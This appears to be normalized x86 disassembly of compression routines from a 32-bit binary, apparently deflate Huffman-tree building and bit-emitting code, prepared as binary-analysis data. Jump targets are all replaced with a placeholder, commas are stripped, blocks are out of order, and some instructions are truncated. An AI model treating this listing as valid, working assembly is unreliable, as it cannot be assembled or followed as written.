mov ebx [ esi + 0x14 ]
mov ebp [ esi + 0x8 ]
inc ebx
mov [ esi + 0x14 ] ebx
mov ecx ebx
xor ebx ebx
mov bl [ esi + 0x16b9 ]
mov [ ecx + ebp ] bl
mov ecx [ esi + 0x14 ]
mov ebx [ esi + 0x16bc ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr dx cl
add ebx 0xfffffff3
mov [ esi + 0x16bc ] ebx
mov [ esi + 0x16b8 ] dx
jmp r-xdata
mov ecx [ esi + 0xb1c ]
inc eax
push eax
mov eax [ esi + 0xb28 ]
inc eax
inc ecx
push eax
push ecx
push esi
call sub_1000c8a0
lea edx [ esi + 0x988 ]
lea eax [ esi + 0x94 ]
push edx
push eax
push esi
call sub_1000d090
add esp 0x1c
jmp r-xdata
sub_1000c170
sub esp 0x8
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ eax ]
mov eax [ eax + 0x8 ]
or ebp 0xffffffff
mov ebx [ eax ]
mov ecx [ eax + 0xc ]
xor eax eax
mov [ esp + 0x14 ] ecx
cmp ecx eax
mov [ esp + 0x10 ] ebp
mov [ esi + 0x1450 ] eax
mov [ esi + 0x1454 ] 0x23d
jle r-xdata
mov ecx [ esi + 0x1450 ]
cmp ecx 0x2
jge r-xdata
mov edx edi
mov edx [ esp + 0x20 ]
mov [ edx + 0x4 ] ebp
mov eax [ esi + 0x1450 ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
cmp ebx 0x1
jl r-xdata
cmp ebp 0x2
jge r-xdata
mov [ edx + 0x2 ] 0x0
mov ecx [ esi + 0x1450 ]
mov [ esp + 0x10 ] eax
inc ecx
mov ebp eax
mov [ esi + 0x1450 ] ecx
mov [ esi + ecx * 4 + 0xb5c ] eax
mov [ eax + esi + 0x1458 ] 0x0
jmp r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
lea eax [ edi + eax * 4 ]
mov [ esp + 0x1c ] eax
push ebx
push edi
push esi
call sub_1000c3b0
add esp 0xc
dec ebx
cmp ebx 0x1
jge r-xdata
xor eax eax
inc ebp
mov eax ebp
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
and ecx 0xff
mov eax ecx
and eax 0xff
jmp r-xdata
mov ecx [ esi + 0x1450 ]
cmp ecx 0x2
jl r-xdata
xor ecx ecx
mov cx [ ebx + eax * 4 + 0x2 ]
mov eax [ esi + 0x16ac ]
sub eax ecx
mov [ esi + 0x16ac ] eax
inc ecx
mov [ esi + 0x1450 ] ecx
mov [ esi + ecx * 4 + 0xb5c ] eax
mov [ edi + eax * 4 ] 0x1
mov [ esi + eax + 0x1458 ] 0x0
mov edx [ esi + 0x16a8 ]
dec edx
test ebx ebx
mov [ esi + 0x16a8 ] edx
je r-xdata
mov eax [ esi + 0x1450 ]
mov ebx [ esi + 0xb60 ]
push 0x1
push edi
mov ecx [ esi + eax * 4 + 0xb5c ]
dec eax
push esi
mov [ esi + 0xb60 ] ecx
mov [ esi + 0x1450 ] eax
call sub_1000c3b0
mov edx [ esi + 0x1454 ]
mov ebp [ esi + 0xb60 ]
add esp 0xc
dec edx
mov eax edx
mov [ esi + 0x1454 ] edx
mov [ esi + eax * 4 + 0xb5c ] ebx
mov ecx [ esi + 0x1454 ]
dec ecx
mov eax ecx
mov [ esi + 0x1454 ] ecx
mov [ esi + eax * 4 + 0xb5c ] ebp
mov dx [ edi + ebp * 4 ]
add dx [ edi + ebx * 4 ]
mov eax [ esp + 0x1c ]
mov [ eax ] dx
mov al [ esi + ebx + 0x1458 ]
mov cl [ esi + ebp + 0x1458 ]
cmp al cl
jb r-xdata
mov edx [ esi + 0x1454 ]
mov ecx [ esi + 0xb60 ]
dec edx
mov [ esi + 0x1454 ] edx
mov eax edx
mov edx [ esp + 0x20 ]
push edx
push esi
mov [ esi + eax * 4 + 0xb5c ] ecx
call sub_1000c490
mov eax [ esp + 0x18 ]
add esi 0xb3c
push esi
push eax
push edi
call sub_1000c6c0
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x14 ]
inc al
push 0x1
push edi
mov [ esi + ecx + 0x1458 ] al
mov eax [ esp + 0x24 ]
mov [ edi + ebp * 4 + 0x2 ] cx
mov [ edi + ebx * 4 + 0x2 ] cx
mov [ esi + 0xb60 ] ecx
inc ecx
add eax 0x4
push esi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x28 ] eax
call sub_1000c3b0
mov eax [ esi + 0x1450 ]
add esp 0xc
cmp eax 0x2
jge r-xdata
mov [ esp + 0x10 ] ebp
sub_1000c3b0
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
mov edx [ eax + 0x1450 ]
push edi
mov ebp [ eax + esi * 4 + 0xb5c ]
lea ecx [ esi + esi ]
cmp ecx edx
mov [ esp + 0x14 ] ebp
jg r-xdata
mov [ eax + esi * 4 + 0xb5c ] ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi [ esp + 0x18 ]
mov esi [ eax + ecx * 4 + 0xb5c ]
mov dx [ edi + ebp * 4 ]
mov bx [ edi + esi * 4 ]
cmp dx bx
jb r-xdata
mov esi [ eax + ecx * 4 + 0xb60 ]
mov ebp [ eax + ecx * 4 + 0xb5c ]
mov dx [ edi + esi * 4 ]
mov bx [ edi + ebp * 4 ]
cmp dx bx
jb r-xdata
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + ecx * 4 + 0xb5c ] ebp
pop ebp
pop ebx
retn
jne r-xdata
inc ecx
jne r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x1c ] ecx
shl ecx 0x1
mov [ eax + edx * 4 + 0xb5c ] esi
mov edx [ eax + 0x1450 ]
cmp ecx edx
jle r-xdata
mov dl [ eax + ebp + 0x1458 ]
mov bl [ esi + eax + 0x1458 ]
cmp dl bl
jbe r-xdata
mov ebp [ esp + 0x14 ]
mov dl [ esi + eax + 0x1458 ]
mov bl [ eax + ebp + 0x1458 ]
cmp dl bl
ja r-xdata
jge r-xdata
mov edx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + edx * 4 + 0xb5c ] ebp
pop ebp
pop ebx
retn
sub_1000c490
sub esp 0x1c
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov ebx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ esp + 0x18 ] ecx
push edi
xor esi esi
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov ebp [ eax + 0x10 ]
mov [ esp + 0x14 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x30 ]
mov ecx 0x8
xor eax eax
lea edi [ edx + 0xb3c ]
mov [ esp + 0x10 ] esi
[ edi ]
mov eax [ edx + 0x1454 ]
mov [ esp + 0x28 ] ebp
mov ecx [ edx + eax * 4 + 0xb5c ]
mov [ ebx + ecx * 4 + 0x2 ] si
mov esi [ edx + 0x1454 ]
inc esi
cmp esi 0x23d
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
lea eax [ edx + esi * 4 + 0xb5c ]
mov [ esp + 0x30 ] eax
mov eax 0x23d
sub eax esi
add esi eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x34 ] esi
mov edi [ esp + 0x1c ]
mov [ ebx + ecx * 4 + 0x2 ] ax
cmp ecx edi
jg r-xdata
mov edi [ esp + 0x10 ]
mov eax ebp
inc edi
mov [ esp + 0x10 ] edi
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x18 ]
add ecx 0x4
dec eax
mov [ esp + 0x30 ] ecx
mov [ esp + 0x18 ] eax
jne r-xdata
mov esi [ esp + 0x20 ]
inc [ edx + eax * 2 + 0xb3c ]
xor edi edi
cmp ecx esi
jl r-xdata
mov ecx [ esp + 0x30 ]
xor eax eax
xor edi edi
mov ecx [ ecx ]
mov ax [ ebx + ecx * 4 + 0x2 ]
mov di [ ebx + eax * 4 + 0x2 ]
mov eax edi
inc eax
cmp eax ebp
jle r-xdata
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov si [ ebx + ecx * 4 ]
add eax edi
and esi 0xffff
imul eax esi
add [ edx + 0x16a8 ] eax
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov edi ecx
sub edi esi
mov esi [ esp + 0x24 ]
mov edi [ esi + edi * 4 ]
lea eax [ ebp - 0x1 ]
cmp [ edx + eax * 2 + 0xb3c ] 0x0
lea ecx [ edx + eax * 2 + 0xb3c ]
jne r-xdata
mov esi [ esp + 0x34 ]
mov ebp [ esp + 0x14 ]
xor eax eax
mov ax [ ebp + ecx * 4 + 0x2 ]
mov ecx [ edx + 0x16ac ]
add eax edi
mov ebp [ esp + 0x28 ]
imul eax esi
add ecx eax
mov [ edx + 0x16ac ] ecx
dec [ edx + eax * 2 + 0xb3c ]
add [ edx + eax * 2 + 0xb3e ] 0x2
dec [ edx + ebp * 2 + 0xb3c ]
sub edi 0x2
test edi edi
jg r-xdata
sub ecx 0x2
dec eax
cmp [ ecx ] 0x0
je r-xdata
test ebp ebp
mov edi ebp
je r-xdata
lea ebp [ edx + ebp * 2 + 0xb3c ]
mov [ esp + 0x18 ] ebp
mov ebp [ esp + 0x18 ]
dec edi
sub ebp 0x2
test edi edi
mov [ esp + 0x18 ] ebp
jne r-xdata
lea ebp [ edx + esi * 4 + 0xb5c ]
xor eax eax
mov ax [ ebp ]
test eax eax
mov [ esp + 0x30 ] eax
je r-xdata
test eax eax
jne r-xdata
lea esi [ ebx + ecx * 4 + 0x2 ]
xor eax eax
mov ax [ esi ]
cmp eax edi
je r-xdata
mov esi [ esp + 0x34 ]
mov ecx [ ebp - 0x4 ]
dec esi
sub ebp 0x4
mov [ esp + 0x34 ] esi
mov esi [ esp + 0x1c ]
cmp ecx esi
mov [ esp + 0x28 ] ebp
jg r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
dec eax
mov [ esp + 0x30 ] eax
mov ebp edi
sub ebp eax
xor eax eax
mov ax [ ebx + ecx * 4 ]
imul ebp eax
mov eax [ edx + 0x16a8 ]
add eax ebp
mov ebp [ esp + 0x28 ]
mov [ edx + 0x16a8 ] eax
mov [ esi ] di
sub_1000c6c0
mov edx [ esp + 0xc ]
sub esp 0x20
xor eax eax
lea ecx [ esp + 0x2 ]
push esi
lea esi [ esp + 0x6 ]
sub edx esi
push edi
mov esi 0xf
mov di [ edx + ecx ]
add ecx 0x2
add di ax
shl edi 0x1
mov eax edi
dec esi
mov [ ecx - 0x2 ] ax
jne r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jl r-xdata
pop edi
pop esi
add esp 0x20
retn
mov esi [ esp + 0x2c ]
lea edi [ eax + 0x1 ]
add esi 0x4
dec edi
jne r-xdata
mov dx [ esp + ecx * 2 + 0x8 ]
push ecx
mov eax edx
and eax 0xffff
inc edx
push eax
mov [ esp + ecx * 2 + 0x10 ] dx
call sub_1000d520
add esp 0x8
mov [ esi ] ax
xor ecx ecx
mov cx [ esi + 0x2 ]
test ecx ecx
je r-xdata
sub_1000c740
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xb1c ]
lea ecx [ esi + 0x94 ]
push eax
push ecx
push esi
call sub_1000c7b0
mov edx [ esi + 0xb28 ]
lea eax [ esi + 0x988 ]
push edx
push eax
push esi
call sub_1000c7b0
lea ecx [ esi + 0xb30 ]
push ecx
push esi
call sub_1000c170
add esp 0x20
mov eax 0x12
mov edx [ esi + 0x16a8 ]
lea ecx [ eax + eax * 2 + 0x11 ]
add edx ecx
mov [ esi + 0x16a8 ] edx
pop esi
retn
dec eax
cmp eax 0x3
jge r-xdata
xor edx edx
mov dl [ eax + r--data ]
cmp [ esi + edx * 4 + 0xa7e ] 0x0
jne r-xdata
sub_1000c7b0
push ecx
mov eax [ esp + 0xc ]
push ebx
xor ecx ecx
push esi
mov cx [ eax + 0x2 ]
push edi
xor edi edi
mov [ esp + 0xc ] 0xffffffff
test ecx ecx
mov edx 0x7
mov esi 0x4
jne r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
mov [ eax + ebx * 4 + 0x6 ] 0xffff
jl r-xdata
mov edx 0x8a
mov esi 0x3
pop edi
pop esi
pop ebx
pop ecx
retn
inc ebx
push ebp
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
lea ebp [ eax + 0x6 ]
cmp edi esi
jge r-xdata
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
add [ ebx + eax * 4 + 0xa7c ] di
jmp r-xdata
mov eax [ esp + 0x1c ]
add ebp 0x4
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
cmp edi 0xa
jg r-xdata
cmp eax [ esp + 0x10 ]
je r-xdata
xor edi edi
mov [ esp + 0x10 ] eax
test ecx ecx
jne r-xdata
mov eax ecx
xor ecx ecx
mov cx [ ebp ]
inc edi
cmp edi edx
jge r-xdata
pop ebp
inc [ ebx + 0xac4 ]
inc [ ebx + 0xac0 ]
jmp r-xdata
inc [ ebx + 0xabc ]
jmp r-xdata
inc [ ebx + eax * 4 + 0xa7c ]
cmp eax ecx
jne r-xdata
mov edx 0x8a
mov esi 0x3
jmp r-xdata
mov edx 0x7
mov esi 0x4
mov edx 0x6
mov esi 0x3
jmp r-xdata
sub_1000c8a0
push ebx
push ebp
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov ecx [ esi + 0x16bc ]
cmp ecx 0xb
jle r-xdata
add eax 0xfffffeff
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x5
mov [ esi + 0x16bc ] ecx
add eax 0xfffffeff
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b9 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edx [ esi + 0x16bc ]
mov ebp [ esi + 0x14 ]
mov cx 0x10
sub cx dx
inc ebp
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x14 ] ebp
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
mov eax [ esp + 0x1c ]
dec eax
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x5
mov [ esi + 0x16bc ] ecx
mov edx [ esp + 0x1c ]
lea eax [ edx - 0x1 ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b9 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edx [ esi + 0x16bc ]
mov ebp [ esi + 0x14 ]
mov cx 0x10
sub cx dx
inc ebp
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x14 ] ebp
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
mov ecx [ esi + 0x16bc ]
cmp ecx 0xb
jle r-xdata
shl eax cl
or [ esi + 0x16b8 ] ax
add ecx 0x4
mov [ esi + 0x16bc ] ecx
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ecx + edi ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16bc ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff4
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
mov ecx [ esi + 0x16bc ]
mov ebp [ esp + 0x20 ]
cmp ecx 0xc
lea eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ esp + 0x18 ]
lea ecx [ esi + 0x94 ]
dec eax
push eax
push ecx
push esi
call sub_1000cb10
mov edx [ esp + 0x28 ]
lea eax [ esi + 0x988 ]
dec edx
push edx
push eax
push esi
call sub_1000cb10
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi + 0x16bc ]
cmp ecx 0xd
jle r-xdata
xor edi edi
test ebp ebp
jle r-xdata
xor eax eax
mov al [ edi + r--data ]
mov dx [ esi + eax * 4 + 0xa7e ]
shl dx cl
or [ esi + 0x16b8 ] dx
add ecx 0x3
mov [ esi + 0x16bc ] ecx
xor edx edx
xor eax eax
mov dl [ edi + r--data ]
mov ax [ esi + edx * 4 + 0xa7e ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b8 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b8 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b9 ]
mov [ ecx + ebx ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16bc ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16bc ] edx
mov [ esi + 0x16b8 ] ax
jmp r-xdata
inc edi
cmp edi ebp
jl r-xdata
sub_1000cb10
sub esp 0x8
mov eax [ esp + 0x10 ]
push ebx
xor ebx ebx
xor edx edx
mov bx [ eax + 0x2 ]
push esi
test ebx ebx
push edi
mov [ esp + 0xc ] 0xffffffff
mov ecx 0x7
mov esi 0x4
jne r-xdata
mov edi [ esp + 0x20 ]
test edi edi
jl r-xdata
mov ecx 0x8a
mov esi 0x3
pop edi
pop esi
pop ebx
add esp 0x8
retn
add eax 0x6
inc edi
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x18 ]
push ebp
mov [ esp + 0x14 ] edi
cmp edx esi
jge r-xdata
cmp ebp ebx
je r-xdata
test ebp ebp
je r-xdata
mov ecx [ eax + 0x16bc ]
xor esi esi
mov si [ eax + ebp * 4 + 0xa7e ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ebp [ esp + 0x24 ]
mov edi [ esp + 0x14 ]
add ebp 0x4
dec edi
mov [ esp + 0x24 ] ebp
mov [ esp + 0x14 ] edi
jne r-xdata
cmp edx 0xa
jg r-xdata
cmp ebp [ esp + 0x10 ]
je r-xdata
mov di [ eax + ebp * 4 + 0xa7c ]
shl di cl
or [ eax + 0x16b8 ] di
add ecx esi
mov [ eax + 0x16bc ] ecx
xor edx edx
mov dx [ eax + ebp * 4 + 0xa7c ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b8 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16bc ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov edi [ esp + 0x24 ]
mov ebp ebx
xor ebx ebx
inc edx
mov bx [ edi ]
cmp edx ecx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] edx
jge r-xdata
pop ebp
mov ecx [ eax + 0x16bc ]
xor esi esi
mov si [ eax + 0xac6 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16bc ]
xor esi esi
mov si [ eax + 0xac2 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16bc ]
xor esi esi
mov si [ eax + 0xabe ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16bc ]
xor esi esi
mov si [ eax + ebp * 4 + 0xa7e ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
jmp r-xdata
dec edx
mov [ esp + 0x20 ] edx
jne r-xdata
mov di [ eax + 0xac4 ]
shl di cl
or [ eax + 0x16b8 ] di
add ecx esi
mov [ eax + 0x16bc ] ecx
xor edx edx
mov dx [ eax + 0xac4 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b8 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16bc ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + 0xac0 ]
shl di cl
or [ eax + 0x16b8 ] di
add ecx esi
mov [ eax + 0x16bc ] ecx
xor edx edx
mov dx [ eax + 0xac0 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b8 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16bc ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + 0xabc ]
shl di cl
or [ eax + 0x16b8 ] di
add ecx esi
mov [ eax + 0x16bc ] ecx
xor edx edx
mov dx [ eax + 0xabc ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b8 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16bc ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + ebp * 4 + 0xa7c ]
shl di cl
or [ eax + 0x16b8 ] di
add ecx esi
mov [ eax + 0x16bc ] ecx
xor edx edx
mov dx [ eax + ebp * 4 + 0xa7c ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b8 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16bc ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov ebx [ esp + 0x1c ]
xor edx edx
test ebx ebx
mov [ esp + 0x10 ] ebp
jne r-xdata
add edx 0xfffffff5
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx 0x7
add edx 0xfffffff5
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff7
mov [ eax + 0x16bc ] esi
mov [ eax + 0x16b8 ] dx
jmp r-xdata
mov ecx [ eax + 0x16bc ]
cmp ecx 0x9
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx 0x3
jmp r-xdata
add edx 0xfffffffd
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff3
mov [ eax + 0x16bc ] esi
mov [ eax + 0x16b8 ] dx
jmp r-xdata
mov ecx [ eax + 0x16bc ]
cmp ecx 0xd
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b8 ] dx
add ecx 0x2
jmp r-xdata
add edx 0xfffffffd
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff2
mov [ eax + 0x16bc ] esi
mov [ eax + 0x16b8 ] dx
jmp r-xdata
mov ecx [ eax + 0x16bc ]
cmp ecx 0xe
jle r-xdata
dec edx
mov [ esp + 0x20 ] edx
cmp ebp ebx
jne r-xdata
mov ecx 0x8a
mov esi 0x3
jmp r-xdata
mov [ eax + 0x16bc ] ecx
mov ecx 0x7
mov esi 0x4
mov ecx 0x6
mov esi 0x3
jmp r-xdata
sub_1000d090
mov eax [ esp + 0x4 ]
sub esp 0x8
xor ecx ecx
mov edx [ eax + 0x16a0 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
test edx edx
je r-xdata
mov ecx [ eax + 0x16bc ]
xor esi esi
mov si [ ebp + 0x402 ]
mov edx 0x10
sub edx esi
cmp ecx edx
jle r-xdata
mov edx [ eax + 0x16a4 ]
xor edi edi
xor ebx ebx
mov di [ edx + ecx * 2 ]
mov edx [ eax + 0x1698 ]
mov bl [ ecx + edx ]
inc ecx
test edi edi
mov edx ebx
mov [ esp + 0x14 ] ecx
jne r-xdata
mov dx [ ebp + 0x400 ]
shl dx cl
or [ eax + 0x16b8 ] dx
add ecx esi
mov [ eax + 0x16bc ] ecx
xor edx edx
mov dx [ ebp + 0x400 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b8 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b8 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b9 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16bc ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b8 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16bc ] edx
jmp r-xdata
xor ebx ebx
mov ecx [ eax + 0x16bc ]
mov bl [ edx + r--data ]
xor esi esi
mov [ esp + 0x1c ] ebx
mov si [ ebp + ebx * 4 + 0x406 ]
mov ebp 0x10
sub ebp esi
mov [ esp + 0x10 ] esi
cmp ecx ebp
jle r-xdata
mov di [ ebp + edx * 4 + 0x2 ]
mov ecx [ eax + 0x16bc ]
mov esi 0x10
sub esi edi
cmp ecx esi
jle r-xdata
xor ecx ecx
pop edi
mov cx [ ebp + 0x402 ]
pop esi
pop ebp
mov [ eax + 0x16b4 ] ecx
pop ebx
add esp 0x8
retn
mov ebp [ esp + 0x20 ]
